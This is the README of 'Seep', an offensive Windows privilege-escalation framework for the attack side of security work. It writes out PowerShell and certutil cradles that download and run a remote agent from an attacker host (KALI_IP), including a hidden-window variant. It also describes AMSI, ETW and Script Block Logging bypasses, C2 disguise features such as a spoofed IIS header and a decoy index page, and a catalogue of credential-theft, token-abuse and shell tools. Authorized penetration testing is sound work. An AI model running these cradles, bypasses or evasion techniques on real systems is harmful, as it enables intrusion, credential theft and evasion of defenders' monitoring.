<div align="center">

<img src="docs/banner.svg" alt="Seep" width="800">

<br>

[![Python](https://img.shields.io/badge/Python-3.9%2B-green.svg)](https://www.python.org/downloads/)
[![PowerShell](https://img.shields.io/badge/PowerShell-3.0%2B-blue.svg)](https://docs.microsoft.com/en-us/powershell/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

<br>

Water finds every crack — so does Seep. A Windows privilege escalation enumeration framework that identifies misconfigurations, credential exposures, and escalation paths across **16 enumeration checks** with **93 tools** in 7 categories, MITRE ATT&CK-mapped recommendations, and single-file HTML reports — all from a fileless agent. Hardened server with upload size limits, decompression bomb protection, XSS-safe HTML, TLS path confinement, zip traversal protection, request timeouts, and security headers.

</div>

<br>

## Table of Contents

- [Highlights](#highlights)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Command Reference](#command-reference)
- [Agent Checks](#agent-checks)
- [Tool Catalog](#tool-catalog)
- [Architecture](#architecture)
- [Tech Stack](#tech-stack)
- [Features](#features)
- [OPSEC](#opsec)
- [Report Output](#report-output)
- [Development](#development)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)

---

## Highlights

<table>
<tr>
<td width="50%">

### 16 Enumeration Checks
Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates, web configs — all producing structured JSON findings with severity ratings.

</td>
<td width="50%">

### 93-Tool Catalog
Organized across 7 categories (Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, Shells) with SHA256 integrity verification and self-hosted distribution via GitHub Releases.

</td>
</tr>
<tr>
<td width="50%">

### MITRE ATT&CK Recommendations
Every finding maps to ATT&CK techniques with actionable exploitation guidance — tool suggestions, example commands, and risk ratings sorted by severity.

</td>
<td width="50%">

### Fileless Execution
Agent runs entirely in memory via IEX cradle. Results are AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/Script Block Logging bypassed automatically. Zero disk footprint.

</td>
</tr>
<tr>
<td width="50%">

### Single-File HTML Reports
Dark-themed, self-contained HTML — no CDN, no external requests. Executive summary, per-finding detail with evidence, remediation guidance, and recommended tools.

</td>
<td width="50%">

### Modular Agent Composer
Cherry-pick checks with `--checks` / `--exclude`. Apply identifier randomization with `--obfuscate` — function names, variables, HTTP headers, and check prefixes are all randomized. The composer assembles a single `.ps1` from 16 independent modules.

</td>
</tr>
<tr>
<td width="50%">

### Concurrent Tool Downloads
`seep catalog download --all` fetches tools from GitHub Releases with 4 parallel workers, SHA256 verification, and automatic symlink organization into category directories.

</td>
<td width="50%">

### Multi-Format Output
HTML, Markdown, and JSON reports from a single result set. Pipe JSON to `jq` for scripted workflows. Reports include MITRE URLs, tool download links, and example commands.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

| Requirement | Version | Notes |
|-------------|---------|-------|
| Python | >= 3.9 | Attack box (Kali, etc.) |
| PowerShell | >= 3.0 | Target (Windows 8+ / Server 2012+) |

### Install

```bash
# From GitHub (recommended)
pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# From a local clone
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep && pipx install .

# For development
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep && pip install -e ".[dev]"
```

> **Note:** [pipx](https://pipx.pypa.io/) installs `seep` in an isolated environment and makes the CLI available globally. Install pipx with `pip install pipx` or `apt install pipx`.

### First Run

```bash
# Initialize workspace
seep init --workdir /tmp/op1

# Download tools (optional — needs GitHub Releases configured)
seep catalog download --all --workdir /tmp/op1

# Start server
seep serve --workdir /tmp/op1

# On target — the server prints ready-to-use cradles with auth tokens
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Generate report from uploaded results
seep report /tmp/op1/results/results_*.json --format html --output report.html
```

> The default HTTP port is `80` (agent delivery + tool downloads) with upload on port `8000`. Override with `--port` and `--upload-port`. Use `--tls` for HTTPS. The server auto-generates an auth token on `init` and prints download cradles with the token on startup.

---

## Usage

### Running the Agent

```bash
# Fileless — agent downloads, auto-executes, results AES-encrypted and uploaded
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Stealth variant — no profile, hidden window
powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# certutil bypass (when WebClient is blocked) — auto-cleans up
certutil -urlcache -split -f http://KALI_IP/agent.ps1?token=TOKEN %TEMP%\s.ps1 && powershell -ep bypass -c ". %TEMP%\s.ps1; Remove-Item %TEMP%\s.ps1 -Force"

# Custom agent with specific checks only
seep compose --checks system_info,user_privileges,services --output agent.ps1
# Then serve or transfer agent.ps1 to target
```

### Managing Tools

```bash
# List all tools
seep catalog list

# Filter by category
seep catalog list --category TokenAbuse

# Search
seep catalog search potato

# Download specific category
seep catalog download --category Enumeration --workdir /tmp/op1

# Download everything
seep catalog download --all --workdir /tmp/op1

# Verify integrity
seep catalog verify --workdir /tmp/op1

# Check for updates
seep catalog update
```

### Working with Results

```bash
# List uploaded results
seep results list --workdir /tmp/op1

# Show finding summary
seep results show /tmp/op1/results/results_20260224_WORKSTATION01.json

# Generate HTML report
seep report results.json --format html --output report.html

# Generate Markdown
seep report results.json --format md --output report.md

# Generate JSON summary
seep report results.json --format json --output summary.json
```

### Composing Agents

```bash
# Full agent (all 16 checks)
seep compose --output agent.ps1

# Minimal agent for quick triage
seep compose --checks system_info,user_privileges,quick_wins --output quick.ps1

# Exclude noisy checks
seep compose --exclude directory_tree,software --output stealth.ps1

# Obfuscated agent
seep compose --obfuscate --output obf_agent.ps1
```

---

## Command Reference

### Global Options

| Flag | Description | Default |
|------|-------------|---------|
| `--workdir`, `-w` | Workspace directory | `~/.seep` |

### Commands

| Command | Description |
|---------|-------------|
| `init` | Initialize workspace (config, directories) |
| `serve` | Start HTTP + upload server |
| `catalog list` | List tools (filter by `--category`, `--platform`) |
| `catalog search <query>` | Search tools by name, description, tags |
| `catalog download` | Download tools (`--category`, `--all`, `--verify`) |
| `catalog verify` | Verify SHA256 integrity of downloaded tools |
| `catalog update` | Check for newer tool releases on GitHub |
| `compose` | Build agent from check modules |
| `report <file>` | Generate report from results (`--format html\|md\|json`) |
| `results list` | List uploaded result files |
| `results show <file>` | Display finding summary from a result |

### `seep serve`

| Flag | Description | Default |
|------|-------------|---------|
| `--port`, `-p` | HTTP listen port | `80` |
| `--upload-port`, `-u` | Upload server port | `8000` |
| `--tls` | Enable HTTPS (self-signed cert) | off |
| `--bind` | Bind address | `0.0.0.0` |

### `seep compose`

| Flag | Description | Default |
|------|-------------|---------|
| `--checks` | Comma-separated check IDs to include | all |
| `--exclude` | Comma-separated check IDs to exclude | none |
| `--obfuscate` | Apply string obfuscation | off |
| `--strip-comments` / `--no-strip-comments` | Strip PowerShell comments | on |
| `--output`, `-o` | Output file path | stdout |

### `seep report`

| Flag | Description | Default |
|------|-------------|---------|
| `--format`, `-f` | Output format: `html`, `md`, `json` | `html` |
| `--output`, `-o` | Output file path | stdout |
| `--include-raw` | Embed raw evidence in HTML | off |

---

## Agent Checks

| # | Check ID | Description | OPSEC |
|:-:|----------|-------------|:-----:|
| 1 | `system_info` | User context, groups, privileges, local accounts, environment | Low |
| 2 | `user_privileges` | Token privileges — flags SeImpersonate, SeAssignPrimaryToken | Low |
| 3 | `network` | Interfaces, open ports, active connections, routing, firewall | Low |
| 4 | `patches` | Installed KB patches, patch gap analysis | Low |
| 5 | `quick_wins` | PS history, saved credentials (cmdkey), autologon registry | Low |
| 6 | `unattend_files` | Unattend.xml / sysprep files with embedded passwords | Medium |
| 7 | `web_configs` | IIS web.config, .NET connection strings, credentials | Medium |
| 8 | `services` | All services + unquoted service path detection | Low |
| 9 | `scheduled_tasks` | Privileged scheduled tasks with writable scripts | Low |
| 10 | `autoruns` | Registry Run keys, startup folders, writable paths | Low |
| 11 | `always_install` | AlwaysInstallElevated MSI escalation check | Low |
| 12 | `software` | Installed software inventory | Low |
| 13 | `processes` | Running processes with owners and binary paths | Low |
| 14 | `dll_hijack` | Writable directories in system PATH | Medium |
| 15 | `directory_tree` | Common paths enumeration | Low |
| 16 | `registry_secrets` | Registry search for stored passwords, keys, sensitive data | Low |

### Critical Alert Findings

| Finding | Severity | Trigger |
|---------|:--------:|---------|
| SeImpersonatePrivilege | CRITICAL | Token abuse path to SYSTEM via potato exploits |
| AutoLogon Credentials | CRITICAL | Plaintext password in Winlogon registry |
| AlwaysInstallElevated | CRITICAL | MSI escalation — install as SYSTEM |
| Unquoted Service Path | HIGH | Binary planting in writable intermediate directory |
| Saved Credentials | HIGH | cmdkey entries usable with `runas /savecred` |

---

## Tool Catalog

93 tools organized across 7 categories, self-hosted via GitHub Releases:

| Category | Count | Representative Tools |
|----------|:-----:|---------------------|
| **Enumeration** | 27 | WinPEAS, SharpUp, Seatbelt, Watson, accesschk, pspy |
| **Credentials** | 12 | Mimikatz, LaZagne, SharpDPAPI, SharpChrome, Rubeus, Snaffler |
| **TokenAbuse** | 10 | PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato |
| **AD** | 16 | SharpHound, Certify, Whisker, PowerView, Kerbrute, KrbRelayUp |
| **Tunneling** | 9 | Chisel, Ligolo-ng, socat, netcat |
| **Impacket** | 18 | secretsdump, GetUserSPNs, psexec, wmiexec, ntlmrelayx |
| **Shells** | 7 | Nishang, PHP shells, netcat variants |

### Self-Hosted Distribution

All tools are hosted on the Seep GitHub repository using GitHub Releases — not committed to git history. This eliminates URL rot, provides integrity verification, and gives full control over tool versions.

```
tools/
├── all/                    # Flat — every tool as symlink
├── categories/
│   ├── Enumeration/        # Category symlinks
│   ├── Credentials/
│   ├── TokenAbuse/
│   ├── AD/
│   ├── Tunneling/
│   ├── Impacket/
│   └── Shells/
├── WinPEAS/                # Actual binaries organized by folder
├── Mimikatz/
├── GodPotato/
└── ...
```

---

## Architecture

Seep follows a two-component architecture: a Python CLI on the attack box orchestrates everything, while a composed PowerShell agent runs on the target and reports back.

```
seep/
├── server/
│   ├── cli.py                  # Click-style CLI (init, serve, catalog, compose, report, results)
│   ├── config.py               # ServerConfig dataclass with YAML serialization
│   ├── agent/
│   │   ├── checks/             # 16 PowerShell check modules
│   │   │   ├── _base.ps1       # Shared helpers (New-Finding, Write-Status, Invoke-Evasion)
│   │   │   ├── system_info.ps1
│   │   │   ├── user_privileges.ps1
│   │   │   ├── network.ps1
│   │   │   └── ...
│   │   ├── templates/
│   │   │   └── agent_wrapper.ps1   # Invoke-Seep entry point
│   │   └── composer.py         # Assembles checks into single .ps1, identifier randomization
│   ├── catalog/
│   │   ├── tools.yaml          # 93 tool definitions (SHA256, categories, MITRE triggers)
│   │   ├── schemas.py          # ToolEntry, ToolCatalog, CategoryDef
│   │   ├── loader.py           # YAML loader with validation
│   │   └── manager.py          # Download, verify, symlinks, update check
│   ├── http/
│   │   ├── serve.py            # Unified HTTP handler (GET /agent, POST /upload, etc.)
│   │   └── tls.py              # Self-signed cert generation
│   ├── results/
│   │   └── parser.py           # JSON/ZIP upload parsing, schema validation
│   └── report/
│       ├── recommendations.py  # Finding→tool mapping with MITRE ATT&CK
│       └── generator.py        # HTML, Markdown, JSON report generation
└── tests/
    ├── conftest.py             # Shared fixtures
    ├── fixtures/
    │   └── sample_results.json # 10 realistic findings for testing
    └── test_*.py               # 391 tests across 12 files
```

### Data Flow

```
seep serve                                    Target (Windows)
    │                                              │
    │  GET /agent.ps1?token=T ───────────────►  IEX download
    │                                              │
    │                                     AMSI / ETW / SBL bypass
    │                                     Invoke-Seep runs (auto)
    │                                     16 checks → JSON
    │                                              │
    │  POST /api/results  ◄──────────────  AES-256-CBC + GZip
    │   (auth via token)                           │
    ▼                                              │
results/results_*.json                             │
    │                                              │
seep report ──► RecommendationEngine               │
    │               │                              │
    │          MITRE mapping                       │
    │          Tool suggestions                    │
    ▼                                              │
report.html (self-contained, dark theme)           │
```

---

## Tech Stack

| Layer | Technology |
|-------|------------|
| **Language** | Python 3.9+ (server), PowerShell 3.0+ (agent) |
| **CLI** | argparse with subcommands |
| **HTTP** | `http.server` stdlib (no Flask, no FastAPI) |
| **TLS** | OpenSSL via subprocess |
| **Catalog** | YAML (`pyyaml`) with SHA256 verification |
| **Downloads** | `urllib.request` with `ThreadPoolExecutor` |
| **Reports** | Self-contained HTML, Markdown, JSON |
| **Testing** | pytest (391 tests) |
| **Linting** | ruff (E, F, W rules) |
| **Encryption** | AES-256-CBC via `cryptography` (agent→server) |
| **CSPRNG** | `secrets` module for identifier randomization and TLS CN selection |
| **Evasion** | AMSI, ETW, Script Block Logging bypasses |

No framework. No Docker. No build step. Just `pip install` with two dependencies (`pyyaml`, `cryptography`).

---

## Features

| Feature | Description |
|---------|-------------|
| **16 enumeration checks** | Modular PowerShell scripts with metadata headers, composable |
| **93-tool catalog** | YAML-defined with SHA256, categories, upstream URLs, license tracking |
| **Severity system** | CRITICAL, HIGH, MEDIUM, LOW, INFO — per finding and per recommendation |
| **MITRE ATT&CK mapping** | Every recommendation links to a technique (T1134.001, T1574.009, etc.) |
| **Fileless agent** | IEX cradle, in-memory GZip compression, HTTP upload — zero disk footprint |
| **Agent composition** | Select/exclude checks, obfuscate strings, strip comments |
| **Concurrent downloads** | 4-worker thread pool with progress output and hash verification |
| **Self-hosted tools** | GitHub Releases — no upstream URL rot, version-pinned |
| **Self-signed TLS** | One-command HTTPS with auto-generated cert, path-confined to workdir |
| **HTML reports** | Dark theme, self-contained, executive summary, recommendations section |
| **Markdown reports** | Pipe-friendly, includes all findings and MITRE links |
| **JSON summary** | Machine-readable output for scripted workflows |
| **Config file** | YAML config with workspace isolation and port validation |
| **Upload receiver** | Accepts JSON, ZIP, and GZip — 50MB upload limit, 200MB decompression limit |
| **Integrity verification** | `seep catalog verify` checks every tool against catalog SHA256 |
| **Update checking** | `seep catalog update` queries GitHub API for newer releases |
| **Symlink organization** | Tools organized into `all/`, `categories/{name}/` via relative symlinks |
| **Security hardened** | Path traversal guards, zip entry validation, XSS escaping, CSP headers, request timeouts, input validation |
| **No external deps at runtime** | Reports have zero CDN calls, agent uses only PowerShell builtins |
| **AMSI bypass** | Reflection-based AMSI patch in cradle and agent — obfuscated format strings |
| **ETW bypass** | Disables `PSEtwLogProvider.etwEnabled` to prevent telemetry |
| **Script Block Logging bypass** | Patches `cachedGroupPolicySettings` to disable SBL |
| **AES-256-CBC encryption** | Results encrypted with SHA256(auth_token) as key, IV prepended |
| **Server header spoofing** | HTTP `Server` header reports `Microsoft-IIS/10.0` |
| **Identifier randomization** | `--obfuscate` uses CSPRNG (`secrets`) to randomize all function names, variables, headers, and check prefixes |
| **Auth-gated endpoints** | All sensitive endpoints require token auth, return 404 (not 401) on failure |
| **Benign index page** | Unauthenticated visitors see generic "It works!" — no C2 self-identification |
| **URL prefix** | Configurable path prefix for endpoint randomization (e.g. `/app`) |
| **CLM detection** | Agent warns and exits gracefully if Constrained Language Mode is active |
| **Random TLS CN** | Self-signed cert uses randomized Common Name from plausible hostname pool |
| **Auto-invoke** | Agent self-executes when auth token is embedded — cradle needs no explicit function call |
| **Base64 token encoding** | Auth token stored as Base64 in composed agent for cosmetic obfuscation, decoded at runtime |

---

## OPSEC

| Layer | Protection | Detail |
|-------|-----------|--------|
| **Pre-download** | AMSI bypass in cradle | Format-string obfuscated patch runs before agent download |
| **Runtime evasion** | ETW + Script Block Logging | `PSEtwLogProvider.etwEnabled` disabled, `cachedGroupPolicySettings` patched |
| **Language mode** | CLM detection | Agent detects Constrained Language Mode and warns before proceeding |
| **Network (server)** | Server header spoofing | Returns `Microsoft-IIS/10.0` — no Python/BaseHTTPServer fingerprint |
| **Network (server)** | Benign index page | Unauthenticated visitors see "It works!" — no C2 indicators |
| **Network (server)** | Auth-gated endpoints | All sensitive routes return 404 without valid token (not 401/403) |
| **Network (server)** | URL prefix | Configurable path prefix (e.g. `/app`) to avoid default path fingerprinting |
| **Network (server)** | Random TLS CN | Self-signed cert uses hostname from plausible pool (mail.local, srv01.corp.local, etc.) |
| **Network (server)** | Request timeouts | 30-second per-request timeout prevents slow-loris denial of service |
| **Network (transport)** | AES-256-CBC encryption | Results encrypted with `SHA256(auth_token)` key, IV prepended, then GZip compressed |
| **Agent identity** | Identifier randomization | `--obfuscate` uses CSPRNG to randomize all function names, variables, HTTP headers, check prefixes |
| **Agent identity** | Comment stripping | `--strip-comments` removes all PowerShell comments from composed agent |
| **Agent identity** | Base64 token encoding | Auth token stored as Base64 in agent for cosmetic obfuscation (not encryption), decoded at runtime |
| **Upload security** | Zip entry validation | ZIP uploads reject entries with path traversal (.. or absolute paths) |
| **Disk artifacts** | Fileless by default | IEX cradle, in-memory execution, no disk writes |
| **Disk artifacts** | Cleanup on disk cradles | certutil/curl cradles use `s.ps1` temp name and auto-delete with `Remove-Item` |
| **Detection surface** | Selective checks | `--checks` / `--exclude` to run only what you need |
| **Timing** | Configurable jitter | Jitter between checks reduces burst telemetry patterns |
| **Timing** | Check shuffling | Randomize check execution order to avoid fingerprinting |
| **Console noise** | Auto-quiet in fileless | Quiet mode activates automatically in fileless execution |
| **Catalog** | Generic User-Agent | Tool downloads use a standard Chrome User-Agent string |

---

## Report Output

### HTML (default)

Single-file, dark-themed, zero external dependencies:

- Executive summary with severity donut and finding counts
- System information panel (hostname, domain, OS, user context)
- Per-finding cards: title, severity badge, description, evidence, remediation
- Recommendations section: MITRE technique, risk level, suggested tools, example commands
- Optional raw JSON evidence embed (`--include-raw`)

### Markdown

Structured sections with tables — suitable for paste into wikis, reports, or Obsidian:

- System info table
- Findings by severity
- Recommendations with MITRE links
- Full evidence blocks

### JSON

Machine-readable summary:

```json
{
  "meta": { "hostname": "WORKSTATION01", "domain": "CORP.LOCAL", ... },
  "findings_count": 10,
  "by_severity": { "critical": 2, "high": 2, "medium": 2, "info": 4 },
  "findings": [ ... ],
  "recommendations": [ ... ]
}
```

---

## Development

### Setup

```bash
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
```

### Testing

```bash
# All 391 tests
python -m pytest tests/ -v

# With coverage
python -m pytest tests/ --cov=server --cov-report=html

# Single file
python -m pytest tests/test_catalog_loader.py -v
```

### Adding a New Check Module

1. Create `server/agent/checks/your_check.ps1`
2. Add metadata header block:

```powershell
<#
.SEEP_CHECK
check_id = your_check
check_name = Your Check Name
category = configuration
description = What this check does
requires_admin = False
opsec_impact = low
estimated_time_seconds = 3
#>
```

3. Use `New-Finding` to emit structured findings:

```powershell
New-Finding -CheckId "your_check" `
    -FindingId "specific_issue" `
    -Severity "high" `
    -Title "Issue Title" `
    -Description "What was found" `
    -Evidence $evidenceString `
    -Remediation "How to fix" `
    -Tags @("tag1", "tag2") `
    -ToolHint @("RelevantTool.exe")
```

4. The composer auto-discovers new `.ps1` files with valid metadata headers

### Adding a New Recommendation Rule

Edit `server/report/recommendations.py` and add an entry to the `RECOMMENDATIONS` list:

```python
{
    "match_finding_ids": ["your_finding_id"],
    "match_tags": ["relevant-tag"],
    "title": "Recommendation Title",
    "description": "What to do and why",
    "mitre_technique": "T1234.001",
    "mitre_name": "Technique Name",
    "risk": "high",
    "tool_names": ["Tool.exe"],
    "example_commands": ["tool.exe --exploit"],
},
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `seep: command not found` | Ensure `pip install -e .` completed and venv is active |
| `Port 80 requires root` | Use `sudo seep serve` or `--port 8080` |
| `catalog download` returns 404 | Configure `release_base_url` in `tools.yaml` to your GitHub repo |
| Agent hangs on upload | Check upload port is open: `ss -tlnp \| grep 8000` |
| No findings in report | Verify results JSON has `findings` key: `jq '.findings \| length' results.json` |
| SHA256 mismatch after download | Tool may have been updated upstream — run `seep catalog update` |
| TLS cert errors on target | Use `-SkipCertificateCheck` in PowerShell 7+ or ignore in IEX cradle |
| `ModuleNotFoundError: yaml` | Install dependency: `pip install pyyaml` |

---

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-check`)
3. Make your changes
4. Run `python -m pytest tests/` — all 391 tests must pass
5. Commit with a descriptive message
6. Open a Pull Request

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

<div align="center">

**Enumerate. Analyze. Recommend. Escalate.**

[GitHub](https://github.com/Real-Fruit-Snacks/Seep) | [License (MIT)](LICENSE) | [Report Issue](https://github.com/Real-Fruit-Snacks/Seep/issues)

</div>
